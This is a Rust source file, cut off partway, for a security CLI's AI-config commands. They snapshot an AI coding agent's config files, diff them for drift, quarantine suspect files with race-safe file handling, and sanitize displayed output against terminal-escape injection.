//! M13 ch5 — `tirith ai scan|diff|quarantine|explain-config|snapshot`.
//!
//! AI-config drift + risk surface for a repo an AI coding agent operates in.
//! `quarantine`'s v1 default is COPY (original UNTOUCHED); `--move` is the
//! destructive variant. Detection lives in the library
//! (`tirith_core::rules::aifile`, `tirith_core::scan`); this module is the CLI
//! presenter + the quarantine filesystem op.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use tirith_core::policy::state_dir;
use tirith_core::rules::aifile;
use tirith_core::verdict::Severity;

use super::{confirm, write_file_atomic, write_json_stdout};

// snapshot store

/// One file's recorded content in the last-known-safe snapshot.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct SnapshotEntry {
    sha256: String,
    content: String,
}

/// The last-known-safe snapshot of a repo's AI-config files.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct Snapshot {
    updated_at: String,
    /// Canonical repo root. `ai diff` / `ai snapshot` refuse to reuse a snapshot
    /// whose recorded root differs from the current root (M13 PR #132 finding I).
    root: String,
    /// `root`-relative path → entry. `BTreeMap` for deterministic on-disk JSON.
    files: BTreeMap<String, SnapshotEntry>,
}

/// Per-repo snapshot path `state_dir()/ai_config_snapshot-<hash>.json`. Repo-
/// specific so `--update` in repo B can't overwrite repo A's baseline, and
/// `ai diff` can't compare against an unrelated snapshot (M13 PR #132 finding I).
fn snapshot_path(root: &Path) -> Option<PathBuf> {
    let hash = root_hash(root);
    state_dir().map(|d| d.join(format!("ai_config_snapshot-{hash}.json")))
}

/// Short hex digest of the canonical repo root, used only to disambiguate
/// per-repo snapshot files (not a security boundary — the recorded `root` inside
/// the snapshot is the authoritative match check).
fn root_hash(root: &Path) -> String {
    let sha = tirith_core::clipboard::content_sha256_hex(root.to_string_lossy().as_bytes());
    sha[..sha.len().min(16)].to_string()
}

/// Load the snapshot for `root`, returning `Ok(None)` when none exists yet. A
/// snapshot whose recorded `root` differs is also treated as absent: it belongs
/// to a different repo and must not be reused (M13 PR #132 finding I).
fn load_snapshot(root: &Path) -> std::io::Result<Option<Snapshot>> {
    let Some(path) = snapshot_path(root) else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "cannot determine tirith state directory",
        ));
    };
    match std::fs::read(&path) {
        Ok(bytes) => {
            let snap: Snapshot = serde_json::from_slice(&bytes).map_err(|e| {
                std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("snapshot at {} is corrupt: {e}", path.display()),
                )
            })?;
            // Defense in depth: refuse to reuse a snapshot whose recorded root
            // no longer matches (hash collision / stale file).
            if snap.root != root.display().to_string() {
                return Ok(None);
            }
            Ok(Some(snap))
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e),
    }
}

/// Emit an operator error as `{"error": ...}` JSON in `--json` mode, else a human
/// stderr line. Returns `false` only when the JSON write itself failed.
fn emit_error(json: bool, ctx: &str, msg: &str) -> bool {
    if json {
        // JSON encodes control chars safely and machine consumers need the raw
        // value, so the JSON path is left UNCHANGED.
        let v = serde_json::json!({ "error": msg });
        write_json_stdout(&v, &format!("{ctx}: failed to write JSON output"))
    } else {
        // `msg`/`ctx` can embed AI-config-derived content carrying terminal
        // escapes; sanitize before printing (tirith must not itself inject).
        eprintln!("{}: {}", sanitize_display(ctx), sanitize_display(msg));
        true
    }
}

/// Resolve the CANONICAL repo root to scan / snapshot. Walks up to the `.git`
/// boundary, falling back to cwd outside a repo. Canonicalized (best-effort) so
/// the snapshot path and recorded `root` are stable across symlinks / `..`.
fn repo_root() -> PathBuf {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let root = tirith_core::policy::find_repo_root(Some(&cwd.to_string_lossy())).unwrap_or(cwd);
    std::fs::canonicalize(&root).unwrap_or(root)
}

/// `root`-relative display key for a file, falling back to the file's own
/// display path when it is not under `root`.
fn rel_key(root: &Path, file: &Path) -> String {
    file.strip_prefix(root)
        .unwrap_or(file)
        .to_string_lossy()
        .replace('\\', "/")
}

// `tirith ai scan`

/// `tirith ai scan` — thin wrapper over `tirith scan --profile ai-agent-repo`
/// scoped to the repo root; no duplicated detection.
pub fn scan(json: bool) -> i32 {
    let root = repo_root();
    super::scan::run(
        Some(&root.to_string_lossy()),
        None,   // file
        false,  // stdin
        false,  // ci
        "high", // fail_on (the profile overrides to its own default)
        json,   // json
        false,  // sarif
        &[],    // ignore
        &[],    // include
        &[],    // exclude
        Some("ai-agent-repo"),
    )
}

// `tirith ai diff`

/// How a tracked AI-config file changed between the snapshot and disk. The
/// lowercase rename keeps the JSON wire byte-identical to the prior stringly-
/// typed values (M13 PR #132 finding F3).
#[derive(Debug, Clone, Copy, Serialize)]
#[serde(rename_all = "lowercase")]
enum DiffStatus {
    Modified,
    Added,
    Removed,
}

impl DiffStatus {
    /// The lowercase label — the SAME string the field serializes to and the
    /// human-mode tag prints, so the enum changes neither wire nor human output.
    fn as_str(self) -> &'static str {
        match self {
            DiffStatus::Modified => "modified",
            DiffStatus::Added => "added",
            DiffStatus::Removed => "removed",
        }
    }
}

impl std::fmt::Display for DiffStatus {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.as_str())
    }
}

/// One file's diff result for JSON output.
#[derive(Debug, Serialize)]
struct FileDiff {
    path: String,
    status: DiffStatus,
    added_instructions: Vec<String>,
    removed_instructions: Vec<String>,
    findings: Vec<tirith_core::verdict::Finding>,
}

/// `tirith ai diff` — compare each current AI-config file to the last-known-safe
/// snapshot and report added / removed lines plus any `AiConfig*` findings.
pub fn diff(json: bool) -> i32 {
    let root = repo_root();
    let snapshot = match load_snapshot(&root) {
        Ok(Some(s)) => s,
        Ok(None) => {
            if json {
                let v = serde_json::json!({
                    "snapshot": serde_json::Value::Null,
                    "message": "no AI-config snapshot recorded yet",
                    "hint": "run `tirith ai snapshot --update` to record the current state",
                });
                if !write_json_stdout(&v, "tirith ai diff: failed to write JSON output") {
                    return 2;
                }
            } else {
                println!("No AI-config snapshot recorded yet.");
                println!("Record the current (trusted) state with:");
                println!("  tirith ai snapshot --update");
            }
            return 0;
        }
        Err(e) => {
            if !emit_error(json, "tirith ai diff", &e.to_string()) {
                return 2;
            }
            return 1;
        }
    };

    let current_files = tirith_core::scan::collect_ai_config_files(&root);

    // Build the union of file keys: those in the snapshot and those on disk now.
    let mut keys: Vec<String> = snapshot.files.keys().cloned().collect();
    let mut current_by_key: BTreeMap<String, PathBuf> = BTreeMap::new();
    for f in &current_files {
        let key = rel_key(&root, f);
        current_by_key.insert(key.clone(), f.clone());
        if !snapshot.files.contains_key(&key) {
            keys.push(key);
        }
    }
    keys.sort();
    keys.dedup();

    let mut diffs: Vec<FileDiff> = Vec::new();
    let mut any_finding = false;

    for key in &keys {
        // Track PRESENCE on each side: "missing" and "empty" are distinct states.
        // A bare `old == new` check (both render as "") would hide the
        // creation/deletion of an empty AI-config (CodeRabbit M13 PR #132 R3-6).
        let existed_before = snapshot.files.contains_key(key);
        let exists_now = current_by_key.contains_key(key);

        let old = snapshot
            .files
            .get(key)
            .map(|e| e.content.clone())
            .unwrap_or_default();
        let new = match current_by_key.get(key) {
            // A present-on-disk file we cannot read must NOT be treated as empty
            // (that fabricates an added/modified diff); surface the error and exit
            // non-zero instead (M13 PR #132 finding J).
            Some(path) => match read_text(path) {
                Ok(content) => content,
                Err(e) => {
                    if !emit_error(
                        json,
                        "tirith ai diff",
                        &format!("cannot read {}: {e}", path.display()),
                    ) {
                        return 2;
                    }
                    return 1;
                }
            },
            None => String::new(), // present in snapshot, gone on disk
        };

        // Skip ONLY when the file exists on BOTH sides with unchanged content;
        // an added or removed file is always reported, even if empty.
        if existed_before && exists_now && old == new {
            continue;
        }

        let status = if existed_before && exists_now {
            DiffStatus::Modified
        } else if exists_now {
            DiffStatus::Added
        } else {
            DiffStatus::Removed
        };

        let added = added_removed(&old, &new);
        let findings = aifile::diff_findings(&old, &new, key);
        if !findings.is_empty() {
            any_finding = true;
        }
        diffs.push(FileDiff {
            path: key.clone(),
            status,
            added_instructions: added.0,
            removed_instructions: added.1,
            findings,
        });
    }

    if json {
        let v = serde_json::json!({
            "snapshot_updated_at": snapshot.updated_at,
            "root": snapshot.root,
            "changed_files": diffs,
        });
        if !write_json_stdout(&v, "tirith ai diff: failed to write JSON output") {
            return 2;
        }
        return if any_finding { 1 } else { 0 };
    }

    if diffs.is_empty() {
        println!("No AI-config drift: every tracked file matches the snapshot.");
        println!("(snapshot recorded {}).", snapshot.updated_at);
        return 0;
    }

    println!(
        "AI-config drift vs snapshot ({} recorded):",
        snapshot.updated_at
    );
    println!();
    for d in &diffs {
        // Every displayed field is AI-config-derived; sanitize so a hostile
        // config cannot inject terminal escapes (R20).
        println!("  {} [{}]", sanitize_display(&d.path), d.status);
        for line in &d.added_instructions {
            println!("    + {}", sanitize_display(line));
        }
        for line in &d.removed_instructions {
            println!("    - {}", sanitize_display(line));
        }
        for f in &d.findings {
            println!(
                "    !! {} ({}): {}",
                f.rule_id,
                f.severity,
                sanitize_display(&f.title)
            );
        }
        println!();
    }
    if any_finding {
        println!("One or more changes tripped an AI-config drift rule (above). Review them,");
        println!("then re-snapshot once trusted: `tirith ai snapshot --update`.");
        return 1;
    }
    println!("Changes detected but no drift rule fired. Re-snapshot once trusted:");
    println!("  tirith ai snapshot --update");
    0
}

/// Compute the added / removed instruction-shaped lines between `old` and `new`.
/// Whitespace-only churn is invisible (lines are trim_end'd + empty-filtered).
/// Returns `(added, removed)`.
fn added_removed(old: &str, new: &str) -> (Vec<String>, Vec<String>) {
    use std::collections::HashMap;
    let norm = |s: &str| -> Vec<String> {
        s.lines()
            .map(|l| l.trim_end().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    };
    let old_lines = norm(old);
    let new_lines = norm(new);
    // Count-based diff (not a HashSet) so a line's surplus on one side is
    // reported as that many added/removed entries.
    let mut old_counts: HashMap<&str, usize> = HashMap::new();
    for l in &old_lines {
        *old_counts.entry(l.as_str()).or_insert(0) += 1;
    }
    let mut new_counts: HashMap<&str, usize> = HashMap::new();
    for l in &new_lines {
        *new_counts.entry(l.as_str()).or_insert(0) += 1;
    }
    // Added: for each new line, emit (new_count - old_count) copies in first-seen
    // order, tracking already-emitted counts to keep the output stable.
    let mut emitted_added: HashMap<&str, usize> = HashMap::new();
    let mut added: Vec<String> = Vec::new();
    for l in &new_lines {
        let surplus = new_counts
            .get(l.as_str())
            .copied()
            .unwrap_or(0)
            .saturating_sub(old_counts.get(l.as_str()).copied().unwrap_or(0));
        let already = emitted_added.entry(l.as_str()).or_insert(0);
        if *already < surplus {
            *already += 1;
            added.push(truncate_line(l));
        }
    }
    // Removed: symmetric.
    let mut emitted_removed: HashMap<&str, usize> = HashMap::new();
    let mut removed: Vec<String> = Vec::new();
    for l in &old_lines {
        let surplus = old_counts
            .get(l.as_str())
            .copied()
            .unwrap_or(0)
            .saturating_sub(new_counts.get(l.as_str()).copied().unwrap_or(0));
        let already = emitted_removed.entry(l.as_str()).or_insert(0);
        if *already < surplus {
            *already += 1;
            removed.push(truncate_line(l));
        }
    }
    (added, removed)
}

/// Truncate a displayed diff line so a hostile long line cannot flood output.
fn truncate_line(s: &str) -> String {
    const MAX: usize = 200;
    if s.chars().count() <= MAX {
        return s.to_string();
    }
    let cut: String = s.chars().take(MAX).collect();
    format!("{cut}…")
}

/// Neutralize one untrusted, AI-config-derived string before printing it in HUMAN
/// mode (CodeRabbit M13 PR #132 R20). Runs it through tirith's own
/// `output_filter` (strips ANSI/OSC/APC/DCS, bare CR, C0 controls except `\t`,
/// DEL, zero-width), then flattens kept tabs/newlines to spaces so one display
/// field stays on a single line.
fn sanitize_display(s: &str) -> String {
    let mut out = Vec::with_capacity(s.len());
    tirith_core::mcp::output_filter::sanitize_text_into(s.as_bytes(), &mut out);
    let cleaned = String::from_utf8(out).unwrap_or_default();
    cleaned
        .chars()
        .map(|c| if c.is_whitespace() { ' ' } else { c })
        .collect()
}

/// Per-file read cap (10 MiB), matching the scan engine's, enforced uniformly by
/// every read path here.
const READ_MAX_BYTES: usize = 10 * 1024 * 1024; // 10 MiB

/// Read a file's RAW bytes with the [`READ_MAX_BYTES`] cap.
///
/// Uses a `take`-bounded read, not stat-then-read: a `metadata().len()` check is
/// a TOCTOU race (the file can grow between stat and read). Reading at most
/// `MAX_BYTES + 1` and rejecting over `MAX_BYTES` bounds memory regardless.
fn read_capped(path: &Path) -> std::io::Result<Vec<u8>> {
    let file = std::fs::File::open(path)?;
    let mut bytes = Vec::new();
    // One byte past the cap so an exactly-`MAX_BYTES` file is accepted.
    file.take(READ_MAX_BYTES as u64 + 1)
        .read_to_end(&mut bytes)?;
    if bytes.len() > READ_MAX_BYTES {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            format!("{} is larger than 10 MiB; skipping", path.display()),
        ));
    }
    Ok(bytes)
}

/// Read a file as UTF-8 (lossy) with the [`READ_MAX_BYTES`] cap.
fn read_text(path: &Path) -> std::io::Result<String> {
    Ok(String::from_utf8_lossy(&read_capped(path)?).into_owned())
}

// `tirith ai quarantine`

/// `tirith ai quarantine <file>` — isolate a (suspected-poisoned) AI-config file.
/// **v1 DEFAULT IS COPY** to `~/.cache/tirith/quarantine/<ts>-<sha256>-<basename>`,
/// leaving the original UNTOUCHED. `--move` is the destructive variant (copy then
/// remove) — prompts unless `--yes`, refuses non-interactively without `--yes`.
pub fn quarantine(file: &str, do_move: bool, yes: bool, json: bool) -> i32 {
    let src = PathBuf::from(file);
    // Capped read (R15-ai.rs:483) so a huge file can't force a full-file
    // allocation before validation; the sha below is over these capped bytes.
    let content = match read_capped(&src) {
        Ok(c) => c,
        Err(e) => {
            if !emit_error(
                json,
                "tirith ai quarantine",
                &format!("cannot read {}: {e}", src.display()),
            ) {
                return 2;
            }
            return 1;
        }
    };

    // PROVISIONAL hash over the bytes just read. For the atomic `rename` move it
    // may go stale (the rename moves whatever is on disk then), so after a
    // successful move we RECOMPUTE from `dest` and correct the name + sha
    // (R15-ai.rs:516) — hence `mut`.
    let mut sha = tirith_core::clipboard::content_sha256_hex(&content);
    let short_sha = sha[..sha.len().min(16)].to_string();
    let ts = chrono::Utc::now().format("%Y%m%dT%H%M%SZ").to_string();
    let basename = src
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("file")
        // Defensive: keep the quarantine name flat (no path separator).
        .replace(['/', '\\'], "_");

    let Some(qdir) = quarantine_dir() else {
        if !emit_error(
            json,
            "tirith ai quarantine",
            "cannot determine the cache directory for the quarantine store",
        ) {
            return 2;
        }
        return 1;
    };
    // 0700 dir — it holds copies of potentially-sensitive config.
    if let Err(e) = create_quarantine_dir(&qdir) {
        if !emit_error(
            json,
            "tirith ai quarantine",
            &format!("cannot create quarantine dir {}: {e}", qdir.display()),
        ) {
            return 2;
        }
        return 1;
    }

    // Pick a non-clobbering destination — `<ts>-<short_sha>-<basename>` is not
    // collision-free (CodeRabbit M13 PR #132 R22, evidence loss). The COPY path
    // uses this advisory probe directly (its no-clobber `write_file_atomic` is
    // the real guard); the `--move` path ATOMICALLY RESERVES via `reserve_dest`
    // (R25) because `std::fs::rename` overwrites and would race the probe.
    let dest_base = format!("{ts}-{short_sha}-{basename}");
    let mut dest = unique_dest(&qdir, &dest_base);

    // --move deletes the original; decide confirmation BEFORE copying so a
    // refused move leaves no stray quarantine copy.
    if do_move
        && !confirm(
            &format!(
                "Move (DELETE original) {} into quarantine? The original will be removed.",
                src.display()
            ),
            yes,
        )
    {
        // `confirm` returns false in TWO distinct situations we must not conflate
        // (CodeRabbit M13 PR #132 R3-7 / R20): (1) an interactive "no" → intentional
        // abort, keep the original, exit 0; (2) no prompt was possible and no
        // `--yes` → nothing confirmed, fail non-zero (exit 2). `--yes` would have
        // short-circuited to true, so reaching here means it was absent.
        let could_prompt = confirmation_possible();
        if json || !could_prompt {
            let _ = emit_error(
                json,
                "tirith ai quarantine",
                "--move deletes the original; pass --yes to confirm (refused without a TTY)",
            );
            return 2;
        }
        // Interactive refusal: the operator deliberately declined.
        println!("Aborted — original left in place (nothing was moved).");
        return 0;
    }

    let mut moved = false;
    if do_move {
        // ATOMICALLY RESERVE the destination before renaming (CodeRabbit M13 PR
        // #132 R25): `std::fs::rename` OVERWRITES its target, so a concurrent run
        // grabbing the same slot in the probe→rename window could clobber / be
        // clobbered (evidence loss). `reserve_dest` claims it with `create_new`
        // and re-picks on a race, so we exclusively own an empty placeholder at
        // `dest`. Reserve only after the confirm gate; fails non-zero on exhaustion.
        match reserve_dest(&qdir, &dest_base) {
            Ok(reserved) => dest = reserved,
            Err(e) => {
                if !emit_error(
                    json,
                    "tirith ai quarantine",
                    &format!(
                        "could not reserve a quarantine slot under {}: {e}",
                        qdir.display()
                    ),
                ) {
                    return 2;
                }
                return 1;
            }
        }
        // DESTRUCTIVE variant. Prefer an ATOMIC `rename` so there is no
        // read→write→delete window (CodeRabbit M13 PR #132 R10-4): a concurrent
        // edit between our read and a later `remove_file` would otherwise discard
        // the newer bytes. `rename` moves the inode atomically and replaces the
        // placeholder we reserved.
        match std::fs::rename(&src, &dest) {
            Ok(()) => {
                moved = true;
            }
            Err(e) if is_cross_device(&e) => {
                // `rename` can't cross filesystems. Fall back to copy-then-delete,
                // but CLOSE the TOCTOU: re-read + re-hash the source immediately
                // before deleting and ABORT if it changed since our initial read.
                // We overwrite the placeholder reserved exclusively for us, so this
                // cannot clobber a stranger's colliding entry.
                if let Err(e) = write_file_atomic(&dest, &content, true) {
                    if !emit_error(
                        json,
                        "tirith ai quarantine",
                        &format!("failed to write quarantine copy {}: {e}", dest.display()),
                    ) {
                        return 2;
                    }
                    return 1;
                }
                // Re-read the source just before the delete and compare hashes; a
                // mismatch means it was edited after our first read, so keep the
                // original and fail rather than lose the newer content.
                match read_capped(&src) {
                    Ok(current) => {
                        let current_sha = tirith_core::clipboard::content_sha256_hex(&current);
                        if current_sha != sha {
                            if !emit_error(
                                json,
                                "tirith ai quarantine",
                                &format!(
                                    "{} changed on disk after it was read; refusing to delete the \
                                     original (the quarantine copy at {} is now stale). Re-run to \
                                     quarantine the current contents.",
                                    src.display(),
                                    dest.display()
                                ),
                            ) {
                                return 2;
                            }
                            return 1;
                        }
                    }
                    Err(e) => {
                        // Could not re-read to confirm unchanged — do NOT delete
                        // blindly. The copy exists, the original stays, exit non-zero.
                        if !emit_error(
                            json,
                            "tirith ai quarantine",
                            &format!(
                                "copied to {} but could not re-read {} to confirm it was unchanged \
                                 before deleting; left the original in place: {e}",
                                dest.display(),
                                src.display()
                            ),
                        ) {
                            return 2;
                        }
                        return 1;
                    }
                }
                if let Err(e) = std::fs::remove_file(&src) {
                    // Copy succeeded but the original couldn't be removed — report
                    // honestly (a copy exists, the original remains), exit 1.
                    if !emit_error(
                        json,
                        "tirith ai quarantine",
                        &format!(
                            "copied to {} but could not remove the original {}: {e}",
                            dest.display(),
                            src.display()
                        ),
                    ) {
                        return 2;
                    }
                    return 1;
                }
                moved = true;
            }
            Err(e) => {
                // Non-cross-device rename failure (permissions, vanished source).
                // The original is untouched and no copy was made.
                if !emit_error(
                    json,
                    "tirith ai quarantine",
                    &format!(
                        "failed to move {} into quarantine at {}: {e}",
                        src.display(),
                        dest.display()
                    ),
                ) {
                    return 2;
                }
                return 1;
            }
        }
    } else {
        // COPY default: write atomically and leave the original UNTOUCHED.
        // No-clobber (`overwrite=false`) so a colliding prior copy is never
        // overwritten (R22 — `dest` chosen by `unique_dest`).
        if let Err(e) = write_file_atomic(&dest, &content, false) {
            if !emit_error(
                json,
                "tirith ai quarantine",
                &format!("failed to write quarantine copy {}: {e}", dest.display()),
            ) {
                return 2;
            }
            return 1;
        }
    }

    // R15-ai.rs:516 — after a MOVE, the bytes at `dest` (on the atomic-rename
    // branch) may differ from the bytes we read up front, leaving the provisional
    // sha/name stale. Re-read `dest`, recompute, and if it differs rename WITHIN
    // the quarantine dir to the corrected `<ts>-<new_short>-<base>` so filename
    // and emitted `sha256` match the on-disk bytes. The cross-device fallback
    // already proved `dest == sha`, so for that branch this is a no-op confirm.
    if moved {
        match read_capped(&dest) {
            Ok(moved_bytes) => {
                let actual_sha = tirith_core::clipboard::content_sha256_hex(&moved_bytes);
                if actual_sha != sha {
                    let new_short = actual_sha[..actual_sha.len().min(16)].to_string();
                    // ATOMICALLY RESERVE the recomputed-hash slot (CodeRabbit M13
                    // PR #132 R25): this `rename` overwrites, so `create_new`
                    // closes the probe→rename TOCTOU. The slot is always distinct
                    // from `dest`. On failure we fail non-zero — the bytes remain
                    // at `dest` under the provisional (still hash-honest) name.
                    let corrected =
                        match reserve_dest(&qdir, &format!("{ts}-{new_short}-{basename}")) {
                            Ok(c) => c,
                            Err(e) => {
                                if !emit_error(
                                    json,
                                    "tirith ai quarantine",
                                    &format!(
                                        "moved {} to {} but could not reserve its \
                                     recomputed-hash name under {}: {e}",
                                        src.display(),
                                        dest.display(),
                                        qdir.display()
                                    ),
                                ) {
                                    return 2;
                                }
                                return 1;
                            }
                        };
                    // Atomic in-quarantine rename to the recomputed-hash name
                    // (same `qdir`, never crosses devices).
                    if corrected != dest {
                        if let Err(e) = std::fs::rename(&dest, &corrected) {
                            if !emit_error(
                                json,
                                "tirith ai quarantine",
                                &format!(
                                    "moved {} to {} but failed to rename it to its \
                                     recomputed-hash name {}: {e}",
                                    src.display(),
                                    dest.display(),
                                    corrected.display()
                                ),
                            ) {
                                return 2;
                            }
                            return 1;
                        }
                        dest = corrected;
                    }
                    sha = actual_sha;
                }
            }
            Err(e) => {
                // Move succeeded but we can't re-read to confirm the hash; fail
                // rather than advertise an unverified (possibly stale) sha.
                if !emit_error(
                    json,
                    "tirith ai quarantine",
                    &format!(
                        "moved {} into quarantine at {} but could not re-read it to \
                         verify its sha256: {e}",
                        src.display(),
                        dest.display()
                    ),
                ) {
                    return 2;
                }
                return 1;
            }
        }
    }

    let restore_cmd = restore_command(&dest, &src);

    if json {
        #[derive(Serialize)]
        struct Out<'a> {
            original: String,
            quarantined_to: String,
            sha256: &'a str,
            moved: bool,
            original_untouched: bool,
            restore_command: String,
        }
        let out = Out {
            original: src.display().to_string(),
            quarantined_to: dest.display().to_string(),
            sha256: &sha,
            moved,
            original_untouched: !moved,
            restore_command: restore_cmd,
        };
        if !write_json_stdout(&out, "tirith ai quarantine: failed to write JSON output") {
            return 2;
        }
        return 0;
    }

    // `src`/`dest` carry attacker-controllable basenames; sanitize before printing
    // (R20). Shell-quoting in `restore_command` does NOT strip ANSI/control bytes,
    // so the PRINTED hint is sanitized too (CodeRabbit M13 PR #132 R22). The JSON
    // field and the executable form are left UNCHANGED (sanitizing them would
    // corrupt the real path).
    let src_disp = sanitize_display(&src.display().to_string());
    let dest_disp = sanitize_display(&dest.display().to_string());
    let sanitized_restore_cmd = sanitize_display(&restore_cmd);
    if moved {
        println!("Moved {src_disp} into quarantine.");
        println!("  quarantine copy: {dest_disp}");
        println!("  the original was REMOVED.");
    } else {
        println!("Copied {src_disp} into quarantine (original UNTOUCHED).");
        println!("  quarantine copy: {dest_disp}");
    }
    println!();
    println!("Restore with:");
    println!("  {sanitized_restore_cmd}");
    0
}

/// Whether an interactive confirmation could ACTUALLY have been obtained
/// (CodeRabbit M13 PR #132 R20). [`super::confirm`] reads the answer from stdin,
/// so we require BOTH stdin (answer readable) AND stderr (prompt visible) to be
/// TTYs. Keying off stderr alone (the old bug) mistook a stdin-piped/EOF run for
/// a deliberate "no" (exit 0); that case must fail non-zero instead.
fn confirmation_possible() -> bool {
    is_terminal::is_terminal(std::io::stdin()) && is_terminal::is_terminal(std::io::stderr())
}

/// Whether a `std::fs::rename` error means source and destination are on
/// DIFFERENT filesystems (atomic rename impossible → copy-then-delete fallback).
/// Matches the raw OS code, not `ErrorKind::CrossesDevices` (stabilized in 1.85;
/// MSRV is 1.83): `EXDEV` on POSIX, `ERROR_NOT_SAME_DEVICE` (17) on Windows.
fn is_cross_device(err: &std::io::Error) -> bool {
    match err.raw_os_error() {
        #[cfg(unix)]
        Some(code) => code == libc::EXDEV,
        #[cfg(windows)]
        Some(code) => code == 17,
        #[cfg(not(any(unix, windows)))]
        Some(_) => false,
        None => false,
    }
}

/// Quarantine store directory: `~/.cache/tirith/quarantine`.
fn quarantine_dir() -> Option<PathBuf> {
    cache_dir().map(|c| c.join("tirith").join("quarantine"))
}

/// Pick a NON-CLOBBERING destination inside `qdir` for `base_name`
/// (`<ts>-<short_sha>-<basename>`) (CodeRabbit M13 PR #132 R22, evidence loss).
/// The triple is not collision-free, so walk a trailing `-1`, `-2`, … suffix
/// (kept operator-legible) until a free path is found. Advisory only — the write
/// still uses no-clobber `write_file_atomic`, which fails loudly on a race. A
/// finite `u32` bound prevents looping; on exhaustion the bare base is returned.
fn unique_dest(qdir: &Path, base_name: &str) -> PathBuf {
    let first = qdir.join(base_name);
    if !first.exists() {
        return first;
    }
    for n in 1..=u32::MAX {
        let candidate = qdir.join(format!("{base_name}-{n}"));
        if !candidate.exists() {
            return candidate;
        }
    }
    first
}

/// Bound on [`reserve_dest`] re-picks when a concurrent run keeps grabbing the
/// candidate; on exhaustion we surface a clean error rather than spin.
const RESERVE_MAX_RETRIES: u32 = 64;

/// ATOMICALLY reserve a fresh quarantine slot inside `qdir` for `base_name`,
/// returning the reserved path. Closes the TOCTOU between [`unique_dest`]'s
/// advisory probe and the `--move` `rename` (CodeRabbit M13 PR #132 R25):
/// `std::fs::rename` OVERWRITES, so a probe-only name could clobber / be clobbered
/// by a concurrent run. We claim the candidate with `create_new(true)` (`O_EXCL` /
/// `CREATE_NEW`), re-picking on [`AlreadyExists`] up to [`RESERVE_MAX_RETRIES`]
/// (else returning the error, never panicking). The returned zero-byte placeholder
/// is exclusively owned: the rename replaces it, and the EXDEV fallback safely
/// overwrites it.
///
/// [`AlreadyExists`]: std::io::ErrorKind::AlreadyExists
fn reserve_dest(qdir: &Path, base_name: &str) -> std::io::Result<PathBuf> {
    let mut last_err: Option<std::io::Error> = None;
    for _ in 0..RESERVE_MAX_RETRIES {
        let candidate = unique_dest(qdir, base_name);
        match std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&candidate)
        {
            // Claimed atomically; we own this empty placeholder.
            Ok(_file) => return Ok(candidate),
            // A concurrent run grabbed this slot; re-pick and retry.
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
                last_err = Some(e);
                continue;
            }
            // Other failures (permissions, vanished dir) aren't retry-able.
            Err(e) => return Err(e),
        }
    }
    // Exhausted retries: return a clean error (no panic).
    Err(last_err.unwrap_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::AlreadyExists,
            "could not reserve a free quarantine slot after repeated collisions",
        )
    }))
}

/// The user's cache base dir (`$XDG_CACHE_HOME` or `~/.cache`). `XDG_CACHE_HOME`
/// is honored ONLY when non-empty AND ABSOLUTE; a relative value would otherwise
/// root the quarantine store under cwd (CodeRabbit M13 PR #132 R22, path escape).
fn cache_dir() -> Option<PathBuf> {
    if let Some(xdg) = std::env::var_os("XDG_CACHE_HOME") {
        let p = PathBuf::from(&xdg);
        if !xdg.is_empty() && p.is_absolute() {
            return Some(p);
        }
    }
    // `home::home_dir()` can also be non-absolute (Unix reads `$HOME` verbatim;
    // empty `$HOME` → `Some("")`), which would likewise escape under cwd. Filter
    // the fallback to absolute paths; `None` is handled as "no cache dir" by the
    // caller (CodeRabbit M13 PR #132 R26).
    home::home_dir()
        .filter(|h| h.is_absolute())
        .map(|h| h.join(".cache"))
}

/// Create the quarantine directory with restrictive permissions (0700 on Unix).
fn create_quarantine_dir(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

/// Single-quote a path for the printed POSIX restore command (embedded single
/// quotes become `'\''`). Non-Windows only so the Windows build doesn't warn.
#[cfg(not(windows))]
fn shell_quote(p: &Path) -> String {
    let s = p.to_string_lossy();
    if s.bytes().all(|b| {
        b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'/' | b':' | b'@' | b',')
    }) {
        return s.into_owned();
    }
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Single-quote a path for a PowerShell literal string (embedded `'` doubled to
/// `''`; backslashes are literal inside single quotes). Always quoted.
#[cfg(windows)]
fn powershell_quote(p: &Path) -> String {
    format!("'{}'", p.to_string_lossy().replace('\'', "''"))
}

/// The shell command that restores a quarantined file by copying it back from
/// `from` to `to`. OS-aware: POSIX `cp` on Unix, PowerShell `Copy-Item
/// -LiteralPath` on Windows (CodeRabbit M13 round-2 R7).
#[cfg(not(windows))]
fn restore_command(from: &Path, to: &Path) -> String {
    // Literal `--` before the operands (R15-ai.rs:780) so a dash-prefixed path
    // (left bare by `shell_quote`) isn't parsed as a `cp` option.
    format!("cp -- {} {}", shell_quote(from), shell_quote(to))
}

#[cfg(windows)]
fn restore_command(from: &Path, to: &Path) -> String {
    format!(
        "Copy-Item -LiteralPath {} -Destination {}",
        powershell_quote(from),
        powershell_quote(to)
    )
}

// `tirith ai explain-config`

/// `tirith ai explain-config <file>` — identify which AI tool a config file
/// configures and print the capabilities / risks its content grants.
pub fn explain_config(file: &str, json: bool) -> i32 {
    let path = PathBuf::from(file);
    let content = match read_text(&path) {
        Ok(c) => c,
        Err(e) => {
            if !emit_error(
                json,
                "tirith ai explain-config",
                &format!("cannot read {}: {e}", path.display()),
            ) {
                return 2;
            }
            return 1;
        }
    };

    let tool = aifile::classify_tool(&path);
